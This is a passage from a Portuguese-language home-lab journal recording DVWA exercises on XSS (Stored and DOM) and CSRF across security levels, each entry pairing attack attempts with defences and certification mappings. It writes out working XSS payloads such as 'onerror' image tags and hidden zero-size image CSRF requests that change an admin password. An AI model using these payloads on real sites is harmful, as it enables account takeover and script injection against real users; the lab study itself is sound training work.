- **Consolidação:** já é o segundo módulo (Reflected e Stored) onde a mesma blacklist reforçada falha da mesma forma — reforça que o problema não é "faltou cobrir mais uma palavra", é a abordagem de blacklist em si, que nunca cobre todos os vetores possíveis.

**Consigo explicar isto a alguém?**
  Porque é que reforçar uma blacklist (case-insensitive) não resolve o problema de fundo: **Sim** — continua a vigiar palavras específicas, não o conceito de "código perigoso"; `onerror` nunca esteve na lista.

### Como nos podemos defender

- **Output encoding**, tratando qualquer input como texto na saída, independentemente da forma (tag, maiúsculas/minúsculas, atributo de evento). É o que se espera confirmar no Impossible.
- **Content Security Policy (CSP)** como camada adicional.
- **HttpOnly** na cookie de sessão.

### Domínios relacionados

- **Security+ — D2 / D4:** limitações de blacklists reforçadas; output encoding
- **CEH — D5 (Web Application Hacking):** bypass de filtros via atributos de evento HTML, independente da robustez da blacklist
- **ISO/IEC 27001 — Anexo A:** A.8.28 (codificação segura)
- **NIS2:** desenvolvimento seguro e tratamento de vulnerabilidades (Art.º 21)

### Próximos passos

- [ ] XSS Stored nível Impossible
- [ ] XSS DOM

---

## Entrada #28 — XSS Stored (nível Impossible)

**Data/hora:** 2026-08-15

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante, Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Testar o XSS Stored contra a defesa de nível Impossible e confirmar se, tal como no Reflected Impossible, a estratégia muda de blacklist para **output encoding** — fechando assim o módulo XSS Stored (Low → Impossible).

### Ação executada

1. DVWA Security → Impossible. Módulo **XSS (Stored)** — lista de entradas dos testes anteriores (Low, Medium, High) ainda visível.
2. **Injeção**, no campo Message, usando o bypass que tinha funcionado em todos os níveis anteriores:
   ```
   <img src=x onerror=alert('XSS')>
   ```
   (Name: `teste`.) Submetido com "Sign Guestbook".

### Resultado

Sem popup. A entrada apareceu na lista com o payload mostrado como **texto literal, escapado**: `&lt;img src=x onerror=alert('XSS')&gt;` — o `<` e o `>` convertidos em entidades HTML, pelo que o browser já não interpreta isto como uma tag, apenas como carateres visíveis. O `onerror` perde por completo o poder de execução.

**Observação adicional relevante:** a entrada mais antiga da lista (submetida no nível Low, na Entrada #25, que na altura aparecia com `Message:` vazia) passou a mostrar o texto completo e visível: `<script>alert('XSS')</script>`. Isto confirma que o output encoding **não altera o que está guardado na base de dados** — o texto em bruto do payload continua lá, inalterado desde o Low. A transformação acontece **no momento de gerar a página** (na saída), sempre que o servidor lê e mostra o conteúdo. Por isso a mesma entrada, perigosa quando vista sem proteção, torna-se inofensiva assim que é mostrada através do código do Impossible.

### Deduções e raciocínio (certos e corrigidos)

- **Previsão certa:** previ que "não passaria — tudo tratado como suspeito à partida", esperando output encoding como no Reflected Impossible. Confirmou-se.
- **Consolidação do padrão entre variantes:** ficou claro que Reflected e Stored partilham exatamente a mesma progressão de defesas nível a nível (mesma blacklist no Medium, mesmo reforço case-insensitive no High, mesmo output encoding no Impossible) — a variante (Reflected/Stored/DOM) determina *onde* o payload vive e *quem* atinge, não *como* se defende dele. O problema de fundo (input tratado como código) e a correção (tratá-lo sempre como texto na saída) são os mesmos.
- **Distinção conceptual nova (discutida antes do teste):** Low/Medium/High representam a **mesma categoria de falha**, com o "esforço necessário" do atacante a variar consoante o vigilante (blacklist) é mais ou menos esperto — um atacante mais experiente (que conhece vetores como `onerror`) passa onde um menos experiente ficaria bloqueado. O Impossible **não é "mais difícil"** — é uma mudança de categoria: deixa de haver lista para contornar, porque a transformação (encoding) se aplica sempre, independentemente da forma do ataque. Nas certificações, isto distingue "quão difícil é o ataque" (função do atacante) de "é estruturalmente possível, sim ou não" (função da arquitetura).

**Consigo explicar isto a alguém?**
  Que o output encoding acontece na saída (não altera os dados guardados) e por isso protege retroativamente até payloads antigos já guardados: **Sim**, com o exemplo concreto visto nesta entrada (a entrada do Low a aparecer subitamente como texto visível).
  A diferença entre "defesa mais difícil de contornar" (Low→High) e "problema estruturalmente resolvido" (Impossible): **Sim** — por palavras minhas, com a analogia do segurança/porta.

### Como nos podemos defender

- **Output encoding no momento de mostrar o conteúdo** — confirmado como a defesa correta e suficiente, independentemente de quando ou como o payload foi guardado.
- **Content Security Policy (CSP)** e **HttpOnly** continuam válidos como camadas adicionais de mitigação, mas o output encoding já resolve a causa raiz do XSS.

### Domínios relacionados

- **Security+ — D2 / D4:** output encoding como controlo eficaz contra XSS persistente
- **CEH — D5 (Web Application Hacking):** diferença entre mitigação (blacklist reforçada) e correção estrutural (encoding na saída)
- **ISO/IEC 27001 — Anexo A:** A.8.28 (codificação segura)
- **NIS2:** desenvolvimento seguro e tratamento de vulnerabilidades (Art.º 21)

### Próximos passos

- [ ] XSS DOM (Low → Impossible) — última variante do módulo XSS
- [ ] CSRF, File Upload, File Inclusion, Brute Force — para fechar a Fase 2

---

## Entrada #29 — XSS DOM (nível Low)

**Data/hora:** 2026-08-15

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante, Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Explorar a variante **DOM** do XSS no nível Low e confirmar na prática a diferença fundamental face ao Reflected e ao Stored: o payload é processado inteiramente pelo **JavaScript do browser**, sem o servidor alguma vez o examinar ou refletir na resposta HTML.

### Ação executada

1. Módulo **XSS (DOM)** — página com um seletor "Please choose a language" (dropdown) e botão "Select".
2. **Caso de controlo:** selecionado "English" e clicado "Select". O URL passou a `?default=English`; a página devolvida pelo servidor é sempre a mesma, independentemente do valor — quem lê `default` do URL e volta a escrevê-lo no dropdown é o JavaScript, já no browser.
3. **Injeção**, editando diretamente o URL:
   ```
   http://192.168.10.101/vulnerabilities/xss_d/?default=<script>alert('XSS')</script>
   ```

### Resultado

O popup "XSS" disparou. O dropdown ficou vazio (sem opção selecionada, porque o payload não é um valor de idioma válido), mas isso não impediu a execução — o script já tinha corrido antes disso. Confirmada a previsão: o Low, tal como em todos os módulos anteriores, não tem defesa nenhuma.

**Mecanismo técnico (source → sink):** o JavaScript da página lê o valor a seguir a `default=` diretamente do URL (**source** — o ponto onde entra o dado controlado pelo atacante) e usa-o para montar a lista de opções do dropdown, tipicamente via `document.write()` (**sink** — o ponto onde o dado é usado de forma que pode executar código), sem qualquer tratamento. Como a source chega ao sink sem ser escapada, o `<script>` é interpretado como HTML/JavaScript real. Nem a source nem o sink passam pelo servidor — ambos vivem inteiramente no browser.

### Deduções e raciocínio (certos e corrigidos)

- **Erro inicial corrigido:** a minha primeira previsão foi que o payload "não ia disparar" por estarmos em modo Low — inversão da lógica correta (Low = sem defesa = mais provável disparar). Ao ser questionado sobre o padrão dos módulos anteriores (Low sempre sem defesa), corrigi a previsão antes de testar, e o teste confirmou a correção.
- **Consolidação do conceito "source/sink":** entendido e por palavras próprias — a source é onde entra o dado do atacante (aqui, o URL), o sink é onde esse dado é usado de forma perigosa (aqui, a escrita no dropdown via JavaScript). O XSS acontece quando uma source chega a um sink sem tratamento pelo meio.
- **Confirmação da teoria do guia:** o guia já descrevia isto como "conceptual, por confirmar na prática" — agora confirmado: o payload viaja no URL (tal como no Reflected), mas quem o processa e executa é só o browser; o servidor devolve sempre a mesma página estática.

**Consigo explicar isto a alguém?**
  A diferença entre Reflected e DOM (ambos usam o URL, mas em Reflected o servidor reflete o valor na resposta, e em DOM é o JavaScript do browser que o lê e escreve, sem o servidor alguma vez o processar): **Sim** — por palavras próprias, com o conceito de source/sink.

### Como nos podemos defender

- **Tratar o problema no próprio JavaScript**, já que a defesa do lado do servidor (blacklist, encoding na resposta) não tem qualquer efeito aqui — o servidor nunca vê o payload processado.
- Usar APIs seguras como `textContent` em vez de `innerHTML`/`document.write()` ao escrever dados vindos do URL ou de outras fontes controláveis pelo utilizador.
- **Content Security Policy (CSP)** como camada adicional, mesmo não vendo o payload no servidor.

### Domínios relacionados

- **Security+ — D2 / D4:** XSS do lado do cliente; falhas específicas de JavaScript
- **CEH — D5 (Web Application Hacking):** DOM XSS como o mais difícil de detetar por ferramentas de análise de tráfego do servidor
- **ISO/IEC 27001 — Anexo A:** A.8.28 (codificação segura)
- **NIS2:** desenvolvimento seguro e tratamento de vulnerabilidades (Art.º 21)

### Próximos passos

- [ ] XSS DOM nível Medium → Impossible
- [ ] Fechar módulo XSS por completo

---

## Entrada #30 — XSS DOM (nível Medium, resultado parcial)

**Data/hora:** 2026-08-15

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante, Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Testar o XSS DOM contra a defesa de nível Medium. Ao contrário dos módulos anteriores, este exercício ficou com uma conclusão **parcial** — os factos foram confirmados, mas o mecanismo exato não foi possível de verificar até ao fim na sessão de hoje.

### Ação executada

1. DVWA Security → Medium. Módulo **XSS (DOM)**.
2. **Teste 1**, payload do Low no URL:
   ```
   http://192.168.10.101/vulnerabilities/xss_d/?default=<script>alert('XSS')</script>
   ```
   Resultado: o URL foi **reescrito automaticamente** para `?default=English` (redirecionamento do servidor). Sem popup.
3. **Teste 2**, bypass habitual:
   ```
   http://192.168.10.101/vulnerabilities/xss_d/?default=<img src=x onerror=alert('XSS')>
   ```
   Resultado: **sem redirecionamento** (o URL manteve-se), mas também **sem popup**.
4. **Investigação do código-fonte** ("View Page Source"): revelou que o JavaScript da página escreve o valor do parâmetro dentro de uma tag `<option>`:
   ```js
   document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
   ```
   Hipótese formada: como `<option>` só aceita texto (não elementos HTML aninhados), o `<img>` poderia estar a ser descartado pelo browser antes de se tornar um elemento real — o que explicaria o `onerror` nunca disparar. A tag `<script>`, por ser tratada de forma especial pelo interpretador HTML, teria continuado a funcionar no Low apesar da mesma limitação.
5. **Teste 3**, tentativa de "fugir" da tag `<option>` fechando-a primeiro:
   ```
   http://192.168.10.101/vulnerabilities/xss_d/?default=</option><img src=x onerror=alert('XSS')>
   ```
   Resultado: sem redirecionamento, mas **também sem popup** — a hipótese da tag `<option>` não foi confirmada por este teste.
6. **Tentativa de confirmação via DevTools:** tentei usar o Inspetor de Elementos e a Consola do Firefox para ver o DOM real após a execução do JavaScript (já que o "View Page Source" só mostra o HTML original, antes do JavaScript correr — distinção importante que ficou clara neste exercício). Não foi possível obter resposta da Consola nem localizar o elemento via o seletor visual, por dificuldades de utilização da ferramenta nesta sessão.

### Resultado

**Confirmado com confiança:**
- O nível Medium introduz um redirecionamento do servidor quando o parâmetro contém `<script` — provavelmente um filtro geral do DVWA aplicado a vários módulos, não específico deste código.
- Nem `<img src=x onerror=alert('XSS')>` nem `</option><img src=x onerror=alert('XSS')>` dispararam o popup neste nível.

**Não confirmado (limitação honesta desta sessão):**
- A razão exata pela qual o `<img onerror>` falha aqui — a hipótese da tag `<option>` só aceitar texto é razoável e baseada no código-fonte real, mas não foi verificada diretamente no DOM (via Inspetor/Consola), por dificuldades técnicas em usar essas ferramentas nesta sessão.

### Deduções e raciocínio (certos e corrigidos)

- **Distinção nova e importante:** "View Page Source" mostra sempre o HTML **original**, antes de qualquer JavaScript correr — nunca vai mostrar o resultado de um `document.write()`. Para ver o DOM real após o JavaScript, é preciso o Inspetor de Elementos ou a Consola. Esta distinção só ficou clara ao tentar (sem sucesso) confirmar a hipótese sobre a tag `<option>`.
- **Valor de documentar o que não se sabe:** em vez de forçar uma conclusão não confirmada, optei por registar a hipótese como hipótese, e a tentativa falhada de a confirmar como parte do processo — em linha com o espírito do projeto de documentar também o que não correu como planeado.

**Consigo explicar isto a alguém?**
  A diferença entre "View Source" e "Inspecionar/DOM real": **Sim**.
  O mecanismo exato de porque o `<img onerror>` falha no Medium: **Não, ainda não** — fica como pergunta em aberto para a próxima sessão.

### Domínios relacionados

- **Security+ — D2 / D4:** limitações de ferramentas de diagnóstico do lado do cliente
- **CEH — D5 (Web Application Hacking):** diferença entre HTML estático e DOM dinâmico na análise de uma aplicação

### O que correu mal / faltou

- Não foi possível confirmar via DevTools (Inspetor/Consola do Firefox) o estado real do DOM depois da injeção — a Consola não respondeu a comandos simples (`1+1`) nem o seletor visual de elementos saltou para o elemento certo. Causa não identificada nesta sessão (pode ser um problema de foco da janela, de exibição do painel, ou outro). A investigar na próxima sessão, possivelmente reiniciando o Firefox ou testando outra forma de abrir o DevTools.

### Próximos passos

- [ ] Resolver o acesso ao DevTools (Inspetor/Consola) do Firefox no Kali
- [ ] Confirmar o mecanismo exato da defesa do DOM Medium
- [ ] XSS DOM nível High → Impossible

---

## Entrada #31 — XSS DOM (nível High)

**Data/hora:** 2026-08-15

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante, Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Testar o XSS DOM contra a defesa de nível High e comparar com o resultado (parcial) do Medium — Entrada #30.

### Ação executada

Repetidos, no nível High, os três testes já feitos no Medium:
1. `?default=<script>alert('XSS')</script>` — redirecionamento para `?default=English`.
2. `?default=<img src=x onerror=alert('XSS')>` — sem redirecionamento, sem popup.
3. `?default=<ScRiPt>alert('XSS')</ScRiPt>` — redirecionamento igual ao `<script>` simples.

### Resultado

**O High comportou-se exatamente como o Medium**, nos três testes. Isto contrasta com o padrão visto no Reflected e no Stored, onde o High trazia sempre uma melhoria clara sobre o Medium (filtro passa a apanhar variações de maiúsculas/minúsculas que o Medium não apanhava). Aqui, o filtro de redirecionamento já era case-insensitive desde o Medium, e ambos os níveis falham da mesma forma perante o `<img onerror>` — reforça a hipótese (ainda não confirmada, ver Entrada #30) de que a causa raiz está na estrutura do sink (`<option>`), não no filtro em si.

### Deduções e raciocínio (certos e corrigidos)

- **Padrão quebrado, e é um resultado válido:** ao contrário de todos os módulos anteriores, aqui Medium e High não diferem. Documentar "não há diferença" é tão importante como documentar uma diferença — evita a suposição de que todos os módulos seguem sempre a mesma progressão em degraus.

**Consigo explicar isto a alguém?**
  Que Medium e High podem, nalguns casos, ter a mesma defesa (não há uma regra universal de que High é sempre "mais um passo" acima do Medium): **Sim**.

### Domínios relacionados

- **Security+ — D2 / D4:** variações reais entre implementações de "níveis" de segurança
- **CEH — D5 (Web Application Hacking):** importância de testar cada nível individualmente, sem assumir progressão

### Próximos passos

- [ ] XSS DOM nível Impossible
- [ ] Fechar módulo XSS DOM e módulo XSS por completo

---

## Entrada #32 — XSS DOM (nível Impossible) — fecha o módulo XSS por completo

**Data/hora:** 2026-08-15

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante, Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Testar o XSS DOM contra a defesa de nível Impossible, fechando o módulo XSS DOM (Low → Impossible) e, com ele, o módulo XSS por completo (Reflected + Stored + DOM).

### Ação executada

Testado no URL:
```
http://192.168.10.101/vulnerabilities/xss_d/?default=<script>alert('XSS')</script>
```

### Resultado

Sem popup. O dropdown mostrou a opção com o valor **codificado em URL, tal como enviado**: `%3Cscript%3Ealert(%27XSS%27)%3C/script%3E` — ou seja, o valor nunca foi decodificado de volta para `<script>...`, ficando como texto opaco e inofensivo. Diferente da forma de output encoding vista no Reflected/Stored Impossible (que convertia `<` em `&lt;`, mostrando o payload de forma legível como texto), aqui a defesa é **não decodificar** o valor original — outra via para o mesmo objetivo: nunca deixar o valor do atacante ser interpretado como HTML/JavaScript.

### Deduções e raciocínio (certos e corrigidos)

- **Confirmação do padrão geral:** tal como nos outros dois módulos XSS, o Impossible resolve o problema de raiz, não com mais uma regra na blacklist. Aqui a via foi diferente na forma (não decodificar, em vez de escapar caracteres), mas o princípio é o mesmo: nunca permitir que o valor do atacante seja tratado como código.
- **Nova nuance aprendida:** existem várias implementações válidas de "tratar o input como texto" — escapar caracteres (`&lt;`) é uma forma; não decodificar a codificação de URL é outra. O objetivo (nunca interpretar como código) é mais importante do que o mecanismo exato usado para o alcançar.

**Consigo explicar isto a alguém?**
  Que o Impossible do DOM resolve o problema de forma diferente do Reflected/Stored (não decodificar, em vez de escapar), mas com o mesmo princípio de fundo: **Sim**.

### Como nos podemos defender

- **Nunca decodificar/interpretar dados vindos do URL (ou de outra source) antes de os mostrar** — tratá-los sempre como texto opaco.
- Usar APIs seguras como `textContent` em vez de `innerHTML`/`document.write()`.
- **Content Security Policy (CSP)** como camada adicional.

### Domínios relacionados

- **Security+ — D2 / D4:** múltiplas implementações válidas de output encoding/escaping
- **CEH — D5 (Web Application Hacking):** DOM XSS resolvido através de tratamento seguro de dados do lado do cliente
- **ISO/IEC 27001 — Anexo A:** A.8.28 (codificação segura)
- **NIS2:** desenvolvimento seguro e tratamento de vulnerabilidades (Art.º 21)

### Balanço do módulo XSS (Reflected + Stored + DOM, Low → Impossible)

Módulo XSS fechado por completo nesta sessão (2026-08-15), com as três variantes exploradas do Low ao Impossible: Reflected (Entradas #21–#24), Stored (Entradas #25–#28) e DOM (Entradas #29–#32, com a Entrada #30 documentando uma limitação honesta — o mecanismo exato do Medium/High do DOM não foi confirmado ao detalhe, por dificuldades com o DevTools do Firefox). Consolidação completa em [`guias-estudo/guia-estudo-xss.md`](./guias-estudo/guia-estudo-xss.md).

### Próximos passos

- [ ] Resolver o acesso ao DevTools do Firefox no Kali (pendente da Entrada #30)
- [ ] CSRF, File Upload, File Inclusion, Brute Force — para fechar oficialmente a Fase 2

---

## Entrada #33 — CSRF (nível Low)

**Data/hora:** 2026-08-15

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante (também "vítima" nesta simulação), Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Primeira exploração do módulo **CSRF** (Cross-Site Request Forgery) do DVWA — perceber e demonstrar na prática um ataque que, ao contrário do SQLi/Command Injection/XSS, não injeta código nenhum: aproveita a sessão já autenticada da vítima para forjar um pedido em nome dela.

### Ação executada

1. DVWA Security → Low. Módulo **CSRF** — formulário "Change your admin password" (Current password, New password, Confirm new password).
2. **Caso de controlo:** mudança de password feita normalmente pelo formulário, confirmando "Password Changed." e observando que o pedido usa **método GET**, com os valores visíveis no URL (`?password_current=...&password_new=...`) — sem token nem verificação extra.
3. **Construção do ataque:** ficheiro HTML criado no Kali (`~/csrf_attack.html`), com uma tag `<img>` cujo `src` aponta para o URL de mudança de password do DVWA, com uma password nova escolhida (`csrfhack2026`):
   ```html
   <img src="http://192.168.10.101/vulnerabilities/csrf/?password_current=x&password_new=csrfhack2026&password_conf=csrfhack2026&Change=Change" width="0" height="0" border="0">
   ```
4. **Execução:** ficheiro aberto localmente no Firefox (`file:///home/pedro/csrf_attack.html`), com a sessão do DVWA ainda ativa no mesmo browser — sem passar pelo formulário oficial em nenhum momento.
5. **Verificação:** logout do DVWA e novo login com a password `csrfhack2026`.

### Resultado

Login bem-sucedido com `csrfhack2026` — password que **nunca foi escrita em nenhum formulário do DVWA**, só existia no ficheiro HTML local. Confirma que o simples ato de abrir a página maliciosa (com a sessão do DVWA ativa) foi suficiente para mudar a password, através do pedido automático desencadeado pela tag `<img>`.

### Deduções e raciocínio (certos e corrigidos)

- **Dificuldade inicial reconhecida:** tive dificuldade em perceber o mecanismo sem uma analogia concreta — as primeiras explicações, mais técnicas e rápidas, não foram suficientes. Só ficou claro com a analogia do "cartão de identificação automático" (a cookie de sessão) e da "sala escondida com um mecanismo que empurra para a porta do banco" (a página maliciosa com o `<img>`).
- **Consolidação do conceito central:** o browser envia a cookie de sessão automaticamente em qualquer pedido a um site, independentemente de qual página ou elemento desencadeou esse pedido — o servidor não tem forma de saber se foi uma ação consciente do utilizador ou um pedido forjado escondido numa página qualquer.
- **Falha adicional do nível Low identificada:** o servidor nem verifica a `password_current` — só usa `password_new`. Isto tornou o ataque ainda mais fácil neste nível específico; nos níveis seguintes isso pode não ser assim.
- **Diferença face ao XSS, agora clara:** no XSS há injeção de código que corre no browser da vítima dentro do site vulnerável; no CSRF não há injeção nenhuma — só se aproveita a sessão já existente da vítima para forjar um pedido a partir de **outro** sítio (mesmo que seja um ficheiro local, como aqui).

**Consigo explicar isto a alguém?**
  O mecanismo geral do CSRF e o papel da tag `<img>`: **Sim**, com a analogia do cartão de identificação/porta do banco.

### Como nos podemos defender

- **CSRF tokens:** um valor secreto e único, gerado pelo servidor e incluído em cada formulário legítimo, que o atacante não consegue adivinhar nem incluir no seu pedido forjado. É a defesa principal.
- **Verificar sempre a `password_current` (ou equivalente)** antes de aceitar uma mudança sensível — reduz o impacto mesmo sem eliminar a causa raiz.
- **SameSite (cookie):** atributo que pode impedir o browser de enviar a cookie de sessão em pedidos vindos de outros sítios.
- Preferir métodos **POST** para ações que alteram dados, aliado a verificação de origem do pedido (não resolve sozinho, mas dificulta ataques simples via `<img>` em GET).

### Domínios relacionados

- **Security+ — D2 / D4:** CSRF como categoria distinta de vulnerabilidade web; tokens anti-CSRF
- **CEH — D5 (Web Application Hacking):** CSRF, diferença face a XSS, exploração sem injeção de código
- **ISO/IEC 27001 — Anexo A:** A.8.28 (codificação segura)
- **NIS2:** desenvolvimento seguro e tratamento de vulnerabilidades (Art.º 21)

### Próximos passos

- [ ] CSRF nível Medium → Impossible

---

## Entrada #34 — CSRF (nível Medium)

**Data/hora:** 2026-08-15

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante (também "vítima"), Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Testar o CSRF contra a defesa de nível Medium, repetindo o mesmo ataque do Low (ficheiro HTML com `<img>`).

### Ação executada

1. **Nota de percurso:** houve confusão inicial — o primeiro teste deu erro "CSRF token is incorrect", que fez suspeitar de token anti-CSRF no Medium. Verificação em "DVWA Security" revelou que o nível estava, na verdade, em **Impossible** (não tinha sido mudado corretamente). Corrigido para Medium.
2. Formulário do CSRF no Medium tem **apenas** "New password" e "Confirm new password" — sem campo "Current password" (diferente do Low). Password de base estabelecida via formulário normal (`password`).
3. Ficheiro `csrf_attack2.html` criado no Kali, com `<img>` a apontar para o URL de mudança de password (`csrfmedium2026`), sem `password_current` no pedido (já que o Medium não tem esse campo):
   ```html
   <img src="http://192.168.10.101/vulnerabilities/csrf/?password_new=csrfmedium2026&password_conf=csrfmedium2026&Change=Change" width="0" height="0" border="0">
   ```
4. Ficheiro aberto localmente no Firefox, com sessão do DVWA ativa. Logout e novo login com `csrfmedium2026`.

### Resultado

Login bem-sucedido com `csrfmedium2026` — **o ataque funcionou no Medium tal como no Low**. Observação relevante: o ficheiro foi aberto via `file://` (protocolo local), que tipicamente não envia cabeçalho "Referer" (ou envia vazio) num pedido subsequente. Se o Medium tivesse uma verificação de Referer, seria expectável que este ataque falhasse nessas condições. Como funcionou, é um indício (não confirmado ao detalhe, sem ver o código-fonte) de que o Medium **não impõe uma defesa eficaz** contra este vetor.

### Deduções e raciocínio (certos e corrigidos)

- **Erro corrigido a meio do processo:** confundi inicialmente Impossible com Medium, por não ter confirmado o nível ativo antes de testar — lição já aprendida noutros módulos (confirmar sempre o nível do DVWA Security antes de testar), mas que valeu a pena reforçar aqui.
- **Confirmação do padrão Low/Medium/High:** tal como discutido antes do teste, Medium continua na mesma categoria de falha que o Low — não resolve a causa raiz, mesmo que a interface do formulário seja ligeiramente diferente (sem campo de password atual).

**Consigo explicar isto a alguém?**
  Que o CSRF continua a funcionar no Medium, e uma hipótese razoável de porquê (falta de verificação eficaz de Referer): **Sim**, com a ressalva de que não foi confirmado ao detalhe.

### Domínios relacionados

- **Security+ — D2 / D4:** limitações de defesas baseadas em Referer
- **CEH — D5 (Web Application Hacking):** importância de confirmar o nível de segurança ativo antes de qualquer teste

### Próximos passos

- [ ] CSRF nível High → Impossible

---

## Entrada #35 — CSRF (nível High)

**Data/hora:** 2026-08-15

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante (também "vítima"), Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Testar o CSRF contra a defesa de nível High, repetindo o mesmo ataque via ficheiro HTML.

### Ação executada

1. DVWA Security → High (confirmado antes de testar, evitando o erro do Medium). Formulário igual ao Medium (sem "Current password").
2. Ficheiro `csrf_attack3.html` criado no Kali, com `<img>` a apontar para o URL de mudança de password (`csrfhigh2026`).
3. Ficheiro aberto localmente no Firefox (`file://`), com sessão do DVWA ativa. Logout e novo login com `csrfhigh2026`.

### Resultado

Login bem-sucedido com `csrfhigh2026` — **o ataque funcionou também no High**. O nível High do DVWA costuma introduzir verificação do cabeçalho **Referer** (confirma se o pedido veio de dentro do próprio site, comparando o Referer com o nome do servidor). Como o ficheiro foi aberto via `file://`, não existe Referer nenhum no pedido — e essa ausência não foi tratada como "pedido suspeito, recusar", mas sim deixada passar. Uma verificação pensada para o caso "Referer errado" não cobriu o caso "Referer inexistente".

### Deduções e raciocínio (certos e corrigidos)

- **Lição nova e importante:** uma defesa pode ter lógica correta para o caso esperado (Referer de outro site) e ainda assim falhar num caso-limite não previsto (Referer ausente). Isto generaliza para além do CSRF — é um padrão comum em falhas de segurança reais: a lógica cobre o "caminho feliz" mas não os casos extremos.
- **Padrão confirmado, terceira vez:** Low, Medium e High continuam todos na mesma categoria — nenhum resolve a causa raiz do CSRF.

**Consigo explicar isto a alguém?**
  Porque é que a verificação de Referer do High falhou neste caso (ausência de Referer, não Referer errado): **Sim**.

### Domínios relacionados

- **Security+ — D2 / D4:** falhas de lógica em casos-limite; verificações de Referer como defesa incompleta
- **CEH — D5 (Web Application Hacking):** técnica real e conhecida de bypass de CSRF via ausência de Referer (ex.: página local, ou certas configurações de proxy/extensões que removem o cabeçalho)

### Próximos passos

- [ ] CSRF nível Impossible (já sabemos, de um erro anterior nesta sessão, que usa tokens anti-CSRF)

---

## Entrada #36 — CSRF (nível Impossible) — fecha o módulo CSRF

**Data/hora:** 2026-08-15

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante (também "vítima"), Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Testar o CSRF contra a defesa de nível Impossible, fechando o módulo. Sessão marcada por um percurso de troubleshooting longo, documentado com honestidade.

### Ação executada (resumo do percurso, incluindo os enganos)

1. Primeira tentativa: ataque via `<img>` "funcionou" (login com a password nova teve sucesso) — resultado surpreendente e suspeito, contrário ao padrão esperado do Impossible.
2. Investigação revelou que o resultado estava **contaminado**: o campo "Current password" do formulário estava a ser preenchido automaticamente pelo gestor de passwords do Firefox com uma password antiga guardada (da primeira password comprida gerada na Entrada #33, nunca anotada), causando confusão nos testes e mensagens de erro ("Passwords did not match or current password incorrect").
3. **Reposição do ambiente:** usado "Setup / Reset DB" para repor a base de dados do DVWA (`admin` / `password`), e removidas as passwords guardadas no Firefox (`about:logins`) para este site.
4. **Teste limpo, repetido:** DVWA Security confirmado em Impossible. Ficheiro `csrf_attack6.html` criado, com `<img>` a apontar para o URL de mudança de password (`impossivelfinal2026`), sem tocar em nenhum formulário oficial antes do teste.
5. Ficheiro aberto no Firefox, logout, tentativa de login com `impossivelfinal2026` → **"Login failed"**. Tentativa de login com `password` (a base do reset) → **sucesso**.

### Resultado

Confirmado, com um ambiente limpo: o CSRF **não funcionou** no nível Impossible — a password nunca mudou. É a primeira vez, neste módulo, que uma defesa resiste de verdade ao ataque, confirmando o padrão já visto nos outros módulos: o Impossible resolve a causa raiz. Aqui, através de **tokens anti-CSRF** (confirmado antes, por engano, pela mensagem "CSRF token is incorrect" ao testar sem token válido).

### Deduções e raciocínio (certos e corrigidos)

- **Falso positivo identificado e corrigido:** o primeiro resultado ("ataque funcionou no Impossible") estava errado, por contaminação do ambiente de teste (autofill do browser), não por falha real da defesa. Só foi possível perceber isto ao questionar o resultado surpreendente em vez de o aceitar sem mais.
- **Lição de metodologia, não só de segurança:** um ambiente de teste "sujo" (passwords antigas guardadas, estado da base de dados incerto) pode gerar conclusões erradas sobre uma vulnerabilidade — tão importante quanto perceber o ataque em si é garantir que o teste está a medir o que se pensa que está a medir. Isto teve custo real: várias trocas de mensagens confusas e cansaço acumulado antes de se perceber o problema.
- **Reconhecimento pessoal, registado com honestidade:** esta sessão foi longa e o cansaço afetou a clareza da comunicação, dos dois lados — instruções demasiado condensadas geraram mais confusão. Vale a pena, em sessões futuras, dar instruções mais detalhadas desde o início quando o cansaço já se faz sentir, em vez de as compactar.

**Consigo explicar isto a alguém?**
  Porque é que o primeiro teste deu um resultado enganador, e como o ambiente de teste (passwords guardadas, estado da BD) pode distorcer conclusões: **Sim**.

### Como nos podemos defender

- **CSRF tokens**, confirmados como defesa eficaz: um valor secreto, verificado a cada pedido, que o atacante não consegue incluir a partir de fora do site.
- Reforço: verificar sempre a password atual antes de aceitar uma mudança sensível (o Impossible reintroduziu o campo "Current password", que o Medium/High tinham dispensado).

### Balanço do módulo CSRF (Low → Impossible)

Módulo CSRF fechado nesta sessão (2026-08-15): Low e Medium sem defesa eficaz (Entradas #33, #34); High com bypass via ausência de cabeçalho Referer (Entrada #35); Impossible resistente, através de tokens anti-CSRF e verificação da password atual (Entrada #36). Consolidação completa em [`guias-estudo/guia-estudo-csrf.md`](./guias-estudo/guia-estudo-csrf.md).

### Domínios relacionados

- **Security+ — D2 / D4:** tokens anti-CSRF como controlo eficaz
- **CEH — D5 (Web Application Hacking):** importância de validar resultados de teste, evitar falsos positivos por contaminação do ambiente
- **ISO/IEC 27001 — Anexo A:** A.8.28 (codificação segura)
- **NIS2:** desenvolvimento seguro e tratamento de vulnerabilidades (Art.º 21)

### Próximos passos

- [ ] File Upload, File Inclusion, Brute Force — para fechar oficialmente a Fase 2
- [ ] Resolver o acesso ao DevTools do Firefox no Kali (pendente da Entrada #30)

---

## Entrada #37 — File Upload (nível Low)

**Data/hora:** 2026-08-16

**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante, Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

